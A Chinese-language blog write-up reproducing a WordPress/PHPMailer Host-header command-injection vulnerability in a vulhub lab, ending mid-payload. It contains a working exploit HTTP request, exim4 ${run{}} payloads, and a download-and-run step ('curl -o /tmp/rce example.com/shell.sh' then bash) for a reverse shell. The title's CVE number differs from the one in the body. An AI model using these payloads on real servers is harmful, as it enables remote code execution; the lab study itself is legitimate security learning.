
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>WordPress 远程命令执行漏洞复现(CVE-2018-15877) - hybcx's blog</title>

  
    <meta name="description" content="0x01 漏洞简述  WordPress 是一种使用 PHP 语言开发的博客平台，用户可以在支持 PHP 和 MySQL 数据库的服务器上架设属于自己的网站。也可以把 WordPress 当作一个内容管理系统（CMS）来使用。WordPress 使用 PHPMailer 组件向用户发送邮件。PHPMailer (版本 &lt; 5.2.18) 存在远程命令执行漏洞，攻击者只需巧妙地构造出一个恶意邮">
<meta property="og:type" content="article">
<meta property="og:title" content="WordPress 远程命令执行漏洞复现(CVE-2018-15877)">
<meta property="og:url" content="http://hybcx.xyz/2023/08/25/wordpress-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2018-15877/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="0x01 漏洞简述  WordPress 是一种使用 PHP 语言开发的博客平台，用户可以在支持 PHP 和 MySQL 数据库的服务器上架设属于自己的网站。也可以把 WordPress 当作一个内容管理系统（CMS）来使用。WordPress 使用 PHPMailer 组件向用户发送邮件。PHPMailer (版本 &lt; 5.2.18) 存在远程命令执行漏洞，攻击者只需巧妙地构造出一个恶意邮">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2023-08-25T09:29:49.367Z">
<meta property="article:modified_time" content="2023-11-12T01:42:36.382Z">
<meta property="article:author" content="hybcx">
<meta property="article:tag" content="CVE">
<meta name="twitter:card" content="summary">
  
  
  
  <meta name="keywords" content="CVE">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/07/25/thm-windows-api-jie-shao/"><span class="title">THM-Windows-API介绍</span></a><a class="item title" href="/2024/07/24/thm-windows-nei-he/"><span class="title">THM-Windows内核</span></a><a class="item title" href="/2024/07/20/thm-shu-ju-xie-lu/"><span class="title">THM-数据泄露</span></a><a class="item title" href="/2024/07/21/linux-ti-quan-zong-jie/"><span class="title">Linux提权总结</span></a><a class="item title" href="/2024/07/16/thm-enumeration/"><span class="title">THM-Enumeration</span></a><a class="item title" href="/2024/07/16/thm-dang-qian-tai-shi/"><span class="title">THM-当前态势</span></a><a class="item title" href="/2024/02/10/thm-linux-quan-xian-ti-sheng/"><span class="title">THM-Linux权限提升</span></a><a class="item title" href="/2024/02/14/thm-basic-pentesting/"><span class="title">THM-Basic Pentesting</span></a><a class="item title" href="/2024/07/20/linux-ti-quan-xue-xi-yi/"><span class="title">Linux提权学习之rbash逃逸</span></a><a class="item title" href="/2023/08/07/qian-xi-mu-lu-chuan-yue/"><span class="title">浅析目录穿越</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/CVE%E6%BC%8F%E6%B4%9E/">CVE漏洞</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2023-08-25T09:29:49.367Z">2023-08-25</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2023-11-12T01:42:36.382Z">2023-11-12</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>WordPress 远程命令执行漏洞复现(CVE-2018-15877)</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h2 id="0x01-漏洞简述">0x01 漏洞简述</h2>
<blockquote>
<p>WordPress 是一种使用 PHP 语言开发的博客平台，用户可以在支持 PHP 和 MySQL 数据库的服务器上架设属于自己的网站。也可以把 WordPress 当作一个内容管理系统（CMS）来使用。WordPress 使用 PHPMailer 组件向用户发送邮件。PHPMailer (版本 &lt; 5.2.18) 存在远程命令执行漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。</p>
</blockquote>
<ul>
<li>漏洞编号： CVE-2016-10033</li>
<li>影响版本： WordPress &lt;= 4.7.1 PHPMailer &lt; 5.2.18</li>
</ul>
<h3 id="漏洞触发条件">漏洞触发条件：</h3>
<ul>
<li>PHP 没有开启 <code>safe_mode</code>（默认）</li>
<li>攻击者需要知道 Web 服务部署的路径</li>
</ul>
<p>成功利用该漏洞后，攻击者可以远程任意代码执行。</p>
<h2 id="0x02-漏洞搭建">0x02 漏洞搭建</h2>
<p>这里我采用vulhub靶场搭建</p>
<p>进入到/vulhub/wordpress/pwnscriptum/目录后，我们执行命令：</p>
<pre><code class="hljs bash">docker-compose up -d</code></pre>
<p>访问对应端口即可，记得安全组放行。进去之后按要求配置信息即可，随后在转到忘记密码页面</p>
<h2 id="0x03-漏洞原理">0x03 漏洞原理</h2>
<p>![image-20230829150129261](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829150129261.png)</p>
<p>此处是管理员重置密码页面，wordpress使用phpmailer组件进行重置密码邮件的发送，但是<code>phpmailer &lt; 5.2.18</code>之前的版本存在命令注入漏洞，具体你可以先阅读分析文章<a target="_blank" rel="noopener" href="https://paper.seebug.org/161/">链接</a> 。</p>
<p>我们来看看这个漏洞在wordpress中的情况。漏洞文件是<code>class.phpmailer.php</code>，我们在wordpress中搜索查看这个文件，该文件在在<code>wp-includes</code>目录下。我们可以发现几行关键代码：</p>
<pre><code class="hljs php"><span class="hljs-comment">/**</span>
<span class="hljs-comment">     * Which method to use to send mail.</span>
<span class="hljs-comment">     * Options: "mail", "sendmail", or "smtp".</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@var</span> string</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Mailer</span> = <span class="hljs-string">'mail'</span>;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * The path to the sendmail program.</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@var</span> string</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Sendmail</span> = <span class="hljs-string">'/usr/sbin/sendmail'</span>;</code></pre>
<p>我们发现，实际上phpmailer组件是调用linux系统命令<code>sendmail</code>进行邮件发送，命令格式为：<code>sendmail -t -i -fusername@hostname</code>。并且我们继续审计代码发现：</p>
<pre><code class="hljs php"><span class="hljs-comment">/**</span>
<span class="hljs-comment">     * Get the server hostname.</span>
<span class="hljs-comment">     * Returns 'localhost.localdomain' if unknown.</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@access</span> protected</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> string</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serverHostname</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable">$result</span> = <span class="hljs-string">'localhost.localdomain'</span>;
        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;Hostname)) {
            <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;Hostname;
        } <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">'SERVER_NAME'</span>, <span class="hljs-variable">$_SERVER</span>) <span class="hljs-keyword">and</span> !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'SERVER_NAME'</span>])) {
            <span class="hljs-variable">$result</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'SERVER_NAME'</span>];
        } <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">'gethostname'</span>) &amp;&amp; <span class="hljs-title function_ invoke__">gethostname</span>() !== <span class="hljs-literal">false</span>) {
            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">gethostname</span>();
        } <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">php_uname</span>(<span class="hljs-string">'n'</span>) !== <span class="hljs-literal">false</span>) {
            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">php_uname</span>(<span class="hljs-string">'n'</span>);
        }
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;
    }</code></pre>
<p><code>serverHostname</code>函数通过传入的<code>SERVER_NAME</code>参数来获取主机名，该主机名即HTTP请求报文中的host值，但是<code>SERVER_NAME</code>参数并没有经过任何过滤，因此我们可以进行任意构造拼接，从而产生了系统命令注入漏洞。</p>
<p>更棒的是，<code>sendmail</code> 提供了<code>-O</code>和<code>-X</code>参数，<code>-X</code>参数用于写入日志文件， 我们可以使用<code>-OQueueDirectory=/tmp/ -X/tmp/smtp.php</code>命令组合，它会将发送的邮件保存到<code>/tmp/smtp.php</code>中， 那么在请求的时候payload应该类似于这样：</p>
<pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wordpress/wp-login.php?action=lostpassword</span> <span class="hljs-meta">HTTP/1.1</span>
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>aaa( -X/tmp/smtp.php )@qq.com</code></pre>
<p>在@前面，如果加上括号，将可以引入空格，这样就可以拼接到了sendmail命令中并且保存了测试邮件文件。那么如果我们写入的是Webshell后门文件呢？</p>
<p>思路很好，然而现实很无奈。</p>
<ul>
<li>wordpress方面以及PHPMailer库方面都会防止攻击者注入空字符（空格或TAB）到sendmail命令中。并且，添加括号引入向sendmail中注入参数的方法已经行不通了，具体可以参考<a target="_blank" rel="noopener" href="http://www.securityspace.com/s_survey/data/man.201703/mxsurvey.html">链接</a>。</li>
<li>比如我们想要调用<code>/bin/touch</code>的时候也会出问题，因为host字段中如果出现<code>/</code>，服务器会拒绝我们的请求。</li>
</ul>
<p>因此上述的Sendmail技术在这种情况下不起作用，这条路走不通了！</p>
<p>正感觉走投无路的时候，这时候我们不妨喝杯茶冷静一下，为什么sendmail能够产生命令注入漏洞呢？我们去了解一下sendmail。然后就会发现柳暗花明又一村了。我们可以知道<code>ubuntu/debain</code>系统中，已经使用exim4替代了sendmail的功能，我们查看sendmail文件可以发现它是一个链向exim4的软链接文件。</p>
<p>![image-20230829151151126](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829151151126.png)</p>
<p>那么我们可以利用exim4的语法参数进行命令执行参数的拼接啊！我们查看exim4的帮助手册，可以发现<code>-be</code>参数</p>
<pre><code class="hljs plaintext">Run Exim in expansion testing mode. Exim  discards  its  root
                 privilege,  to prevent ordinary users from using this mode to
                 read otherwise inaccessible files. If no arguments are given,
                 Exim  runs interactively, prompting for lines of data. Other‐
                 wise, it processes each argument in turn.

                 If Exim was built with USE_READLINE=yes in Local/Makefile, it
                 tries  to  load  the libreadline library dynamically whenever
                 the -be option is used without  command  line  arguments.  If
                 successful,  it  uses the readline() function, which provides
                 extensive line-editing facilities, for reading the test data.
                 A line history is supported.

                 Long expansion expressions can be split over several lines by
                 using backslash continuations. As in Exim's run time configu‐
                 ration,  white  space  at  the start of continuation lines is
                 ignored. Each argument or data line  is  passed  through  the
                 string  expansion  mechanism, and the result is output. Vari‐
                 able values from the configuration file (for example,  $qual‐
                 ify_domain)  are  available,  but  no message-specific values
                 (such as $message_exim_id) are set,  because  no  message  is
                 being processed (but see -bem and -Mset).

                 Note:  If  you  use  this  mechanism to test lookups, and you
                 change the data files or databases you are  using,  you  must
                 exit  and  restart  Exim before trying the same lookup again.
                 Otherwise, because each Exim process caches  the  results  of
                 lookups,  you will just get the same result as before.  Macro
                 processing is done  on  lines  before  string-expansion:  new
                 macros  can  be defined and macros will be expanded.  Because
                 macros in the config file are often used for  secrets,  those
                 are only available to admin users.</code></pre>
<p><strong>下面同样也是<code>${substr{10}{1}{$tod_log}}</code>与<code>${substr{0}{1}{$spool_directory}}</code>的原理：</strong></p>
<p>我们可以知道<code>ubuntu/debain</code>系统中，已经使用exim4替代了sendmail的功能，我们查看sendmail文件可以发现它是一个链向exim4的软链接文件。</p>
<p>![image-20230825175812446](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175812446.png)</p>
<p>那么我们可以利用exim4的语法参数进行命令执行参数的拼接啊！我们查看exim4的帮助手册，可以发现<code>-be</code>参数，简单来说，<code>-be</code>参数是一个字符串拓展测试命令，它可以读取一些变量的数据。比如，<code>$tod_log</code>，它可以显示系统时间。</p>
<p>并且，exim4提供了一些函数用来执行一些命令，如字符串截取函数<code>substr</code>、<code>$run</code>系统调用函数。</p>
<p>我们可以截取空格字符。如图所示，substr函数从第十个字符开始截取，共截取一个字符，也就是时间字符串的第11个字符，是空格字符。</p>
<p>![image-20230825175901430](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175901430.png)</p>
<p>那么同理，我们也可以截取<code>/</code>字符串：</p>
<p>![image-20230825175909679](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175909679.png)</p>
<p>我们测试使用<code>$run</code>函数调用系统命令</p>
<p>![image-20230825175924125](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175924125.png)</p>
<p>到这里，遇到的问题都解决了。</p>
<h2 id="0x04-漏洞复现">0x04 漏洞复现</h2>
<h3 id="exp">EXP</h3>
<pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wp-login.php?action=lostpassword</span> <span class="hljs-meta">HTTP/1.1</span>
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target(any -froot@localhost -be ${run{【要执行的命令】}} null)
<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*
<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>56
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded

<span class="language-pgsql">wp-submit=<span class="hljs-keyword">Get</span>+<span class="hljs-built_in">New</span>+<span class="hljs-keyword">Password</span>&amp;redirect_to=&amp;user_login=<span class="hljs-keyword">admin</span></span></code></pre>
<p>我们在数据包中将要执行的命令，插入到上述payload中指定的位置，就可以实现命令执行了。但是，这个漏洞的利用存在很大的限制，主要限制如下所示：</p>
<pre><code class="hljs plaintext">1.执行的命令不能包含大量特殊字符，如:、引号等。
2.命令会被转换成小写字母
3.命令需要使用绝对路径
4.需要知道某一个存在的用户的用户名
5.我们处理后的命令会执行，但是不会显示到页面上。
为了解决这些坑，漏洞作者想出了，利用 ${substr{0}{1}{$spool_directory}} 代替 / ，用 ${substr{10}{1}{$tod_log}} 代替空格的方法。

但是还是有很多字符不能用，所以我们需要将待执行的命令放到第三方网站中，然后通过 curl -o /tmp/rce example.com/shell.sh 的方法先将他下载到 /tmp 目录中，再去执行。</code></pre>
<h3 id="利用">利用</h3>
<p>所以，总体来说利用过程如下：</p>
<ul>
<li>编写反弹 shell 的 exp，放到某个网页里。有如下要求：
<ul>
<li>整个 url 的大写字母会被转换成小写，所以大写小敏感的系统不要使用大写字母做文件路径</li>
<li>访问该网页不能跳转，因为 follow 跳转的参数是 <code>-L</code> （大写）</li>
</ul>
</li>
<li>拼接成命令 <code>/usr/bin/curl -o/tmp/rce example.com/shell.sh</code> 和命令 <code>/bin/bash /tmp/rce</code></li>
<li>将上述命令中的空格和 / 转换成 <code>${substr{10}{1}{$tod_log}}</code> 和 <code>${substr{0}{1}{$spool_directory}}</code></li>
<li>拼接成 HTTP 包的 Host 头： <code>target(any -froot@localhost -be ${run{command}} null)</code></li>
<li>依次发送这两个拼接好的数据包</li>
</ul>
<h3 id="复现">复现</h3>
<p>漏洞缺陷处在后台找回密码的地方<br>
初始化管理员用户名和密码后访问 <code>https://ip:8080/wp-login.php</code>，点击忘记密码界面</p>
<p>![image-20230825180517679](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825180517679.png)<br>
这里用户名为 @1_h bcx</p>
<p>我们于是可以构造payload如下，该payload在/tmp/目录下创建test.txt文件：</p>
<pre><code class="hljs plaintext">aa(any -froot@localhost -be ${run{/bin/touch /tmp/test.txt}} null)</code></pre>
<blockquote>
<p>空格  ==&gt; ${substr{10}{1}{$tod_log}}</p>
<p>/  ==&gt; ${substr{0}{1}{$spool_directory}}</p>
</blockquote>
<p>转换过来就是</p>
